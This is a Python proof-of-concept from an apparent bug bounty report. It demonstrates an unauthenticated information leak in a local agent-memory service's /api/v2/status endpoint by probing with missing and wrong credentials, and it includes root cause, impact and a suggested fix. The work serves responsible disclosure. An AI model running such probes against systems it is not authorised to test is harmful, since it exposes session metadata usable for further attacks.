#!/usr/bin/env python3
"""
BUG 6 — Unauthenticated /api/v2/status Information Leak
=========================================================
Severity: MEDIUM
Status: CONFIRMED LIVE (tested 2026-10-11)

Attack summary
--------------
GET /api/v2/status returns the active agent's id, namespace, and session
expiry to ANY loopback caller regardless of credential.  Passing a wrong
API key, an empty key, or no credential at all all yield HTTP 200 with
identical data.

    GET /api/v2/status
    (no credential)
    → 200 {"agent_id": "sec-95d9f6e",
            "namespace": "memanto_agent_sec-95d9f6e",
            "expires_at": "2026-10-11T15:05:19Z", ...}

Root cause
----------
The endpoint depends on verify_moorcheh_api_key, which grants access to any
loopback TCP connection without checking the presented credential.  The
loopback trust path returns the server key unconditionally:

    if (is_loopback_host(client_host)
            and _is_loopback_host_header(...)
            and not _is_cross_site_browser_request(...)
            and not _has_forwarded_non_loopback(...)):
        return server_key        # ← no credential verification

Impact
------
  • Namespace leakage: the namespace is the primary index into memory
    storage.  An attacker who learns it can combine it with other bugs
    (e.g. a compromised Moorcheh API key) to query memories directly.
  • Session timing: expires_at reveals the exact session window, useful
    for timing concurrent activation attacks.
  • Agent ID disclosure: agent IDs are the sole access token for
    activation endpoints from loopback.

This bug is in scope under "unauthorized access to non-sensitive metadata"
(MEDIUM on the bounty severity matrix, issue #1852).

Fix
---
  Require a valid credential before returning session state, even on
  loopback.  Either:
    a) Add a hard credential check in get_status() before calling
       get_session_service().get_active_session(), or
    b) Replace the dependency with a stricter variant that does not
       grant loopback-only callers read access to session metadata.

Prerequisites
-------------
  pip install requests

Usage
-----
  python bug6_status_info_leak.py --host http://127.0.0.1:8765
"""

import argparse
import sys

import requests


def step(n, msg):  print(f"\n[Step {n}] {msg}")
def ok(msg):       print(f"  \033[92m[PASS]\033[0m  {msg}")
def fail(msg):     print(f"  \033[91m[VULN]\033[0m  {msg}")
def info(msg):     print(f"  \033[94m[INFO]\033[0m  {msg}")


def run(host: str) -> None:
    api = f"{host}/api/v2"

    print("=" * 65)
    print("BUG 6 — Unauthenticated /api/v2/status Information Leak")
    print("=" * 65)

    # Activate an agent so there is an active session to observe
    step(1, "Activate an agent to create a live session")
    r = requests.get(f"{api}/agents", timeout=5)
    if r.status_code != 200 or not r.json().get("agents"):
        print("  No agents found — create one first with `memanto agent create`")
        sys.exit(1)
    agent_id = r.json()["agents"][0]["agent_id"]
    info(f"Target agent: {agent_id!r}")

    r = requests.post(f"{api}/agents/{agent_id}/activate", timeout=10)
    if r.status_code not in (200, 409):
        print(f"  Could not activate agent: HTTP {r.status_code}")
        sys.exit(1)
    if r.status_code == 200:
        tok = r.json()["session_token"]
        info("Agent activated for this test run")
    else:
        tok = None
        info("Agent was already active")

    # Probe /status with various (wrong or missing) credentials
    step(2, "Query /api/v2/status with wrong / absent credentials")
    probes = [
        ({},                                   "No credential at all"),
        ({"X-Api-Key": "WRONG_KEY_12345"},     "Wrong X-Api-Key"),
        ({"X-Api-Key": ""},                    "Empty X-Api-Key"),
        ({"Authorization": "Bearer BADTOKEN"}, "Wrong Bearer token"),
    ]

    leaked = False
    for headers, label in probes:
        r = requests.get(f"{api}/status", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            fail(f"{label:35s} → HTTP 200")
            info(f"  agent_id  = {data.get('agent_id')!r}")
            info(f"  namespace = {data.get('namespace')!r}")
            info(f"  expires_at= {data.get('expires_at')!r}")
            leaked = True
        elif r.status_code in (401, 403):
            ok(f"{label:35s} → HTTP {r.status_code} (credential required)")
        else:
            info(f"{label:35s} → HTTP {r.status_code}")

    # Cleanup
    if tok:
        requests.post(f"{api}/agents/{agent_id}/deactivate",
                      headers={"X-Session-Token": tok}, timeout=5)

    print("\n" + "=" * 65)
    print("BUG 6 — SUMMARY")
    print("=" * 65)
    if leaked:
        print("""
  VULNERABLE: /api/v2/status returns active session metadata to any
  loopback caller regardless of whether a valid credential is presented.

  Root cause: verify_moorcheh_api_key grants loopback TCP peers full
              access without checking the presented credential at all.

  Impact:   namespace + agent_id + expiry disclosed unauthenticated.

  Fix:      enforce a real credential check in get_status() even when
            the caller connects from loopback.
""")
    else:
        print("  Not vulnerable on this build.")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Bug 6 PoC — /status info leak")
    p.add_argument("--host", default="http://127.0.0.1:8765")
    args = p.parse_args()
    run(args.host)
